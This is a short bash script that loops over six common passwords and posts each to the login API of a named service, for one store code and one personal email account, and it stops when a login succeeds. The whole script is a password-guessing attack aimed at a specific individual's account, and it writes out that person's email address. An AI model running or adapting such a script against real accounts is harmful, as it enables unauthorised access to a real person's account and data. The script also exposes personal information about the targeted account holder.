#!/bin/bash
for PASS in "Admin@123" "admin@123" "123456" "Admin123!" "Abcd1234@" "Ti100600@"; do
  RESULT=$(curl -s -X POST "https://sbox.sana.vn/api/auth/login" \
    -H "Content-Type: application/json" \
    -d "{\"storeCode\":\"truongphat\",\"userName\":\"ngthihanh2011@gmail.com\",\"password\":\"$PASS\"}")
  ISSUCCESS=$(echo "$RESULT" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('isSuccess',''))" 2>/dev/null)
  echo "Pass=$PASS -> isSuccess=$ISSUCCESS"
  if [ "$ISSUCCESS" = "True" ]; then break; fi
done